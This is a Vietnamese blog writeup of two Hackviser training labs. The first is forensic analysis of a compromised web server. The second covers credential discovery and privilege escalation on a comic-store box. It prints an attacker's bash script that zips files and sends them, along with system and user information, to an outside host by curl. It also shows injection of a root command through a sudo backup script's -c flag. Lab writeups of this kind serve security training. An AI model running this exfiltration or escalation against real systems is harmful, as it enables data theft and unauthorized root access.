---
title: '[Writeup] Hackviser Scenarios'
description: "Đây là writeup của các Lab trong Scenarios Hackviser"
tag: ['Writeup', 'Web', 'Hackviser']
top_img: /img/2025/hackviser/logo.png
cover: /img/2025/hackviser/logo.png
category: ['Writeup', 'Hackviser']
date: 2025-08-06 08:56:38
author:
    - d4kw1n
---

# First Say

- Ghi chú lại lời giải của những Lab ở phần Scenarios của nền tảng Hackviser.
- Tháng 8 này phải hard để trong top 5 ^^

# HackTrace

## Description

![HackTrace Description](/img/2025/hackviser/hacktrace-des0.png)

![HackTrace Description](/img/2025/hackviser/hacktrace-des.png)

![HackTrace Question](/img/2025/hackviser/hacktrade-ques.png)

## Solution

- Đây là một challenge nghiên về Defend, chúng ta sẽ được cung cập quyền truy cập vào server bị tấn công nên chỉ cần tập trung vào việc phân tích các hoạt động tấn công của Hacker.
- Run challenge và "Go to Machine".

### 1. What is the IP address of the attacker who targeted the website?

- Để trả lời cho câu hỏi này, chúng ta sẽ kiểm tra nội dung của file `/var/log/apache2/access.log` (Đây là file lưu trữ nhật ký truy cập vào web của apache).

```bash
> head /var/log/apache2/access.log
10.0.0.41 - - [03/Feb/2024:08:33:50 -0500] "GET / HTTP/1.1" 200 4050 "-" "gobuster/3.6"
10.0.0.41 - - [03/Feb/2024:08:33:50 -0500] "GET /6e5e4550-fe97-42cd-8ce7-bb952a70f255 HTTP/1.1" 404 432 "-" "gobuster/3.6"
10.0.0.41 - - [03/Feb/2024:08:33:50 -0500] "GET /cgi-bin HTTP/1.1" 404 432 "-" "gobuster/3.6"
10.0.0.41 - - [03/Feb/2024:08:33:50 -0500] "GET /education HTTP/1.1" 404 432 "-" "gobuster/3.6"
10.0.0.41 - - [03/Feb/2024:08:33:50 -0500] "GET /go HTTP/1.1" 404 432 "-" "gobuster/3.6"
10.0.0.41 - - [03/Feb/2024:08:33:50 -0500] "GET /accessibility HTTP/1.1" 404 432 "-" "gobuster/3.6"
10.0.0.41 - - [03/Feb/2024:08:33:50 -0500] "GET /- HTTP/1.1" 404 432 "-" "gobuster/3.6"
10.0.0.41 - - [03/Feb/2024:08:33:50 -0500] "GET /tv HTTP/1.1" 404 432 "-" "gobuster/3.6"
10.0.0.41 - - [03/Feb/2024:08:33:50 -0500] "GET /text HTTP/1.1" 404 432 "-" "gobuster/3.6"
10.0.0.41 - - [03/Feb/2024:08:33:50 -0500] "GET /radio HTTP/1.1" 404 432 "-" "gobuster/3.6"
```

![Access Log](/img/2025/hackviser/access-log-hacktrade.png)

> Answer: 10.0.0.41

### 2. What tool did the attacker use for directory scanning?

- Dựa vào kết quả của `access.log` thì dễ dàng thấy được attacker đang scan bằng tool `gobuster`

> Answer: gobuster

### 3. What is the name of the file uploaded by the attacker to the system that allows remote computer access via the web?

![Malicious File Uploaded By Hacker](/img/2025/hackviser/hacktrade-shell.png)

> Answer: shell.php

### 4. Which function in the software is responsible for the file upload vulnerability?

- Vì lỗ hổng bị khai thác là Upload File nên chỉ cần đọc nội dung file upload.php để tìm đáp án.

![Upload Function](/img/2025/hackviser/hacktrade-upload.png)

> Answer: uploadFile

### 5. Which important file has the attacker stolen from the system by compressing it into a zip file?

- Ở trong danh sách các file thì có một file lạ có tên là: `xdfds.sh`
- Đọc nội dung file này

```bash
> ls
2023-resumes  fontawesome-5.5  index.php  magnific-popup  upload.php  xdfds.sh
css       img          js     slick       uploads
> cat xdfds.sh
#!/bin/bash


zip -r /tmp/2023-resumes.zip /var/www/html/2023-resumes

curl -F "file=@/tmp/2023-resumes.zip" http://dataprocessingframework.hv/upload

hostname > /tmp/system_info.txt
uname -a >> /tmp/system_info.txt
ifconfig >> /tmp/system_info.txt

curl -F "file=@/tmp/system_info.txt" http://dataprocessingframework.hv/upload

cut -d: -f1 /etc/passwd > /tmp/users.txt
curl -F "file=@/tmp/users.txt" http://dataprocessingframework.hv/upload
> 
```

![Malicios Bash File](/img/2025/hackviser/hacktrade-maliciousbash.png)

> Answer: 2023-resumes.zip

### 6. Which domain did the attacker use to upload the data they accessed?

- Dựa vào nội dung của file `xdfds.sh` để tìm đáp án

> Answer: dataprocessingframework.hv

# Comicstore

## Description

![Short Description](/img/2025/hackviser/Comicstore-short-des.png)

![Description](/img/2025/hackviser/Comicstore-des.png)

![Task](/img/2025/hackviser/comicstore-task.png)

## Solution

### 1. What could be a potential username?

![Potential Username](/img/2025/hackviser/comicstore-username.png)

Khi sử dụng trang web thì có thể dễ dàng thấy được email của một quản trị viên.

> Answer: johnny

### 2. Looks like the admin has left a note for himself. What is the password?

- Ở đây, mình sẽ dùng công cụ `feroxbuster` để scan các đường dẫn, file ẩn. Ở kết quả scan, mình phát hiện ở đường dẫn `/_notes` có lưu trữ những file chứa thông tin nhạy cảm.

![_notes folder](/img/2025/hackviser/comicstore-folder-note.png)

- Xem nội dung từng file thì mình thu thập được danh sách các password có cả SSH

```txt
warthunder forum: 920312036099
my dota account: KR9ZT@Z
my ssh account: bl4z3
reddit alt-account: 2367ruest-emile
steam community: trustno11still07
```

> Answer: bl4z3

### 3. What is the name of the directory where comic books are kept?

- Với username và password, connect đến SSH thôi

![Connect to SSH](/img/2025/hackviser/commicstore-ssh.png)

- Mò mẫm một xíu thì tìm được đáp án

```bash
johnny@comicstore:~$ ls
Desktop  Documents  Music  Public  Videos
johnny@comicstore:~$ ls Documents/
myc0ll3ct1on
johnny@comicstore:~$ ls Documents/myc0ll3ct1on/
notetomyself.txt  NotSoRare.cba  Rare.cba  scamlist.csv  SuperRare.cba  VeryRare.cba
johnny@comicstore:~$
```

> Answer: myc0ll3ct1on

### 4. What is the name of the script that is used for backing up mp3 files?

- Sử dụng lệnh `sudo -l` để xem thử các script, bin mà user johnny có thể chạy bằng quyền root => Phát hiện được đáp án cần tìm.

```bash
johnny@comicstore:~$ sudo -l
Matching Defaults entries for johnny on comicstore:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User johnny may run the following commands on comicstore:
    (root) NOPASSWD: /opt/.securebak/backup_mp3.sh
johnny@comicstore:~$
```

> Answer: /backup_mp3.sh

### 5. What is the name of the richest person in the Scamlist.csv file?

- Mình thử đọc file `Scamlist.csv` thì bị báo không có quyền do file thuộc quyền root và không cho phép người dùng khác rwx.

```bash
johnny@comicstore:~$ cat Documents/myc0ll3ct1on/
notetomyself.txt  NotSoRare.cba     Rare.cba          scamlist.csv      SuperRare.cba     VeryRare.cba
johnny@comicstore:~$ cat Documents/myc0ll3ct1on/scamlist.csv
cat: Documents/myc0ll3ct1on/scamlist.csv: Permission denied
johnny@comicstore:~$ ls -l Documents/myc0ll3ct1on/scamlist.csv
-rw------- 1 root root 274 May  2  2024 Documents/myc0ll3ct1on/scamlist.csv
johnny@comicstore:~$
```

- Xem qua nội dung của file `backup_mp3.sh`

```bash
johnny@comicstore:~$ cat /opt/.securebak/backup_mp3.sh
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee -a /run/media/johnny/BACKUP/backedup.txt

# archive file to keep track of files
input="/run/media/johnny/BACKUP/backedup.txt"

while getopts c: flag; do
  case "${flag}" in
    c) command=${OPTARG};;
  esac
done

backup_files="/home/johnny/Music/song*.mp3"

# backup location
dest="/run/media/johnny/BACKUP"

# archive filename.
hostname=$(hostname -s)
archive_file="$hostname-bak.tar.gz"

# print starting message
echo "Backing up $backup_files to $dest/$archive_file" && echo

# backing up the files
tar czf $dest/$archive_file $backup_files

# print ending message
echo && echo "Backup finished"

cmd=$($command) && echo $cmd
johnny@comicstore:~$
```

- Theo như bash script trên thì chúng ta có thể chèn command vào bằng flag `-c`
=> Thực hiện sudo và đọc được file `scamlist.csv`

```bash
johnny@comicstore:~$ sudo /opt/.securebak/backup_mp3.sh -c "cat Documents/myc0ll3ct1on/scamlist.csv"
tee: /run/media/johnny/BACKUP/backedup.txt: No such file or directory
Backing up /home/johnny/Music/song*.mp3 to /run/media/johnny/BACKUP/comicstore-bak.tar.gz

tar: Removing leading `/' from member names
tar: /home/johnny/Music/song*.mp3: Cannot stat: No such file or directory
tar (child): /run/media/johnny/BACKUP/comicstore-bak.tar.gz: Cannot open: No such file or directory
tar (child): Error is not recoverable: exiting now
tar: Child returned status 2
tar: Error is not recoverable: exiting now

Backup finished
Name,ComicIssue,Price,Notes Garey Elwyn,#144,500,A poor student that is hardly worth it. Rudy Darryl,#64,350,A total comic book nerd. Emily Randolf,#98,300,This woman is rolling in money Jones Nick,#32,500,Idk might get more. Charleen Kayla,#11,300,Buying for her bf. Raise
johnny@comicstore:~$
```

> Answer: Emily Randolf
